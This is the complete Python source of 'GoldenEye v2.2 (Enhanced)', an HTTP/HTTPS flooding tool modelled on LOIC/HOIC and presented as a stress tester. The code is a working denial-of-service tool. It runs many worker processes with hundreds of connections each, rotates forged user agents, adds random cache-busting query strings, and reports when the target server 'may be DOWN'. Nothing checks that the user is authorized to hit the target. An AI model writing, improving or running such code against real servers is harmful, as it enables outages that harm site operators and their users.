#!/usr/bin/env python3

"""
GoldenEye v2.2 (Enhanced) inspired by LOIC/HOIC

This version adds better support for HTTPS and random payload generation to mimic behavior of tools like LOIC and HOIC for more effective stress testing of HTTP/HTTPS servers.

Author: Pem Tshering @KnottyEngineer
Date: 2024-10-18
License: GNU General Public License version 3 (GPLv3)
"""

from multiprocessing import Process, Manager
import urllib.parse, ssl
import sys, getopt, random, os
import http.client as HTTPCLIENT

#####
# Config
#####
DEBUG = False
SSLVERIFY = True

#####
# Constants
#####
METHOD_GET = 'get'
METHOD_POST = 'post'
METHOD_RAND = 'random'

JOIN_TIMEOUT = 1.0

DEFAULT_WORKERS = 10
DEFAULT_SOCKETS = 500

GOLDENEYE_BANNER = 'GoldenEye v2.2 (Enhanced)'

USER_AGENT_PARTS = {
    'os': {
        'linux': {'name': ['Linux x86_64', 'Linux i386'], 'ext': ['X11']},
        'windows': {'name': ['Windows NT 10.0', 'Windows NT 6.1', 'Windows NT 6.3'], 'ext': ['WOW64', 'Win64; x64']},
        'mac': {'name': ['Macintosh'], 'ext': [f'Intel Mac OS X {random.randint(10, 11)}_{random.randint(0, 9)}']},
    },
    'platform': {
        'webkit': {
            'name': [f'AppleWebKit/{random.randint(535, 537)}.{random.randint(1, 36)}' for _ in range(1, 30)],
            'details': ['KHTML, like Gecko'],
            'extensions': [f'Chrome/{random.randint(60, 100)}.0.{random.randint(1000, 4000)}.{random.randint(0, 100)} Safari/{random.randint(535, 537)}.{random.randint(1, 36)}']
        },
        'gecko': {
            'name': [f'Gecko/{random.randint(2001, 2024)}{random.randint(1, 31):02}{random.randint(1, 12):02} Firefox/{random.randint(50, 100)}.0' for _ in range(1, 30)],
        }
    }
}

#####
# GoldenEye Class
#####
class GoldenEye:
    def __init__(self, url):
        self.url = url
        self.manager = Manager()
        self.counter = self.manager.list((0, 0))
        self.workersQueue = []
        self.useragents = self.build_useragents()
        self.nr_workers = DEFAULT_WORKERS
        self.nr_sockets = DEFAULT_SOCKETS
        self.method = METHOD_RAND  # Allows random switching between GET and POST

    def printHeader(self):
        print(f"\n{GOLDENEYE_BANNER}\n")

    def build_useragents(self):
        useragents = []
        for os, data in USER_AGENT_PARTS['os'].items():
            for platform, details in USER_AGENT_PARTS['platform'].items():
                for ua in details['name']:
                    # Handle cases where 'details' and 'extensions' keys may be missing
                    details_part = details.get('details', [''])
                    extensions_part = details.get('extensions', [''])
                    useragents.append(f"{data['name'][random.randint(0, len(data['name']) - 1)]} {details_part[0]} {ua} {extensions_part[random.randint(0, len(extensions_part) - 1)]}")
        return useragents

    def fire(self):
        self.printHeader()
        print(f"Hitting webserver in mode '{self.method}' with {self.nr_workers} workers and {self.nr_sockets} connections each. Hit CTRL+C to cancel.")
        if DEBUG:
            print(f"Starting {self.nr_workers} concurrent workers")

        for i in range(int(self.nr_workers)):
            try:
                worker = Striker(self.url, self.nr_sockets, self.counter)
                worker.useragents = self.useragents
                worker.method = self.method
                self.workersQueue.append(worker)
                worker.start()
            except Exception as e:
                print(f"Failed to start worker {i}: {e}")
                pass
        self.monitor()

    def monitor(self):
        while len(self.workersQueue) > 0:
            try:
                for worker in self.workersQueue:
                    if worker and worker.is_alive():
                        worker.join(JOIN_TIMEOUT)
                    else:
                        self.workersQueue.remove(worker)
                self.stats()
            except (KeyboardInterrupt, SystemExit):
                print("CTRL+C received. Killing all workers")
                for worker in self.workersQueue:
                    try:
                        worker.stop()
                    except Exception:
                        pass

    def stats(self):
        try:
            if self.counter[0] > 0 or self.counter[1] > 0:
                print(f"{self.counter[0]} GoldenEye strikes hit. ({self.counter[1]} Failed)")
                if self.counter[0] > 0 and self.counter[1] > 0 and self.counter[1] > self.counter[0]:
                    print("\tServer may be DOWN!")
        except Exception:
            pass


class Striker(Process):
    def __init__(self, url, nr_sockets, counter):
        super().__init__()
        self.url = urllib.parse.urlparse(url).path or '/'
        self.host = urllib.parse.urlparse(url).netloc.split(':')[0]
        self.port = urllib.parse.urlparse(url).port or (443 if urllib.parse.urlparse(url).scheme == 'https' else 80)
        self.ssl = urllib.parse.urlparse(url).scheme == 'https'
        self.counter = counter
        self.nr_socks = nr_sockets
        self.useragents = []
        self.method = METHOD_GET
        self.socks = []
        self.runnable = True

    def run(self):
        while self.runnable:
            try:
                for i in range(self.nr_socks):
                    if self.ssl:
                        conn = HTTPCLIENT.HTTPSConnection(self.host, self.port, context=ssl._create_unverified_context()) if not SSLVERIFY else HTTPCLIENT.HTTPSConnection(self.host, self.port)
                    else:
                        conn = HTTPCLIENT.HTTPConnection(self.host, self.port)
                    self.socks.append(conn)
                for conn in self.socks:
                    (url, headers) = self.generatePayload()
                    method = random.choice([METHOD_GET, METHOD_POST]) if self.method == METHOD_RAND else self.method
                    conn.request(method.upper(), url, None, headers)
                    conn.getresponse()
                    self.counter[0] += 1
                self.closeConnections()
            except:
                self.counter[1] += 1

    def closeConnections(self):
        for conn in self.socks:
            conn.close()

    def generatePayload(self):
        url = self.url + '?' + '&'.join([f"{self.buildblock(5)}={self.buildblock(5)}" for _ in range(3)])
        headers = {
            'User-Agent': random.choice(self.useragents),
            'Cache-Control': 'no-cache',
            'Host': self.host,
        }
        return (url, headers)

    def buildblock(self, size):
        return ''.join(random.choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(size))

    def stop(self):
        self.runnable = False
        self.terminate()


def main():
    if len(sys.argv) < 2:
        print("Please provide a URL")
        sys.exit(2)

    url = sys.argv[1]
    goldeneye = GoldenEye(url)
    goldeneye.fire()


if __name__ == '__main__':
    main()
